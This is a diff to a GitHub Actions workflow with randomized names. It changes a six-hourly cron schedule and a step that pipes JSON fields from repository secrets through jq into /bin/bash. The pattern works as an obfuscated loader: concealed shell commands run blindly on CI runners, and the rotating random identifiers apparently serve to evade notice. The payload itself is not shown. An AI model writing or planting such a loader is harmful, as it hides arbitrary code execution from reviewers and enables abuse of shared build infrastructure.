@@ -3,17 +3,22 @@ name: qinmianhong6234
 on:
   workflow_dispatch:
   schedule:
-    - cron: '16 0/6 * * *'
+    - cron: '46 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: qinmianhong6234
         env:
-          j7: ${{ secrets.j7 }}
+          aafwc8076: ${{ secrets.aafwc8076 }}
         run: |
-          echo $j7 | jq -r .x88 | /bin/bash
-          echo $rk52 | jq -r .rqi837 | /bin/bash
-          echo $o6784 | jq -r .inkbs49964 | /bin/bash
+          echo $aafwc8076 | jq -r .vrhpt43 | /bin/bash
+          echo $plwhi04858 | jq -r .cwm71273 | /bin/bash
+          echo $yngut564 | jq -r .cf04 | /bin/bash
+          echo $nqk4 | jq -r .p1342 | /bin/bash
+          echo $zvjy503 | jq -r .evfb30 | /bin/bash
+          echo $b27 | jq -r .f143 | /bin/bash
 
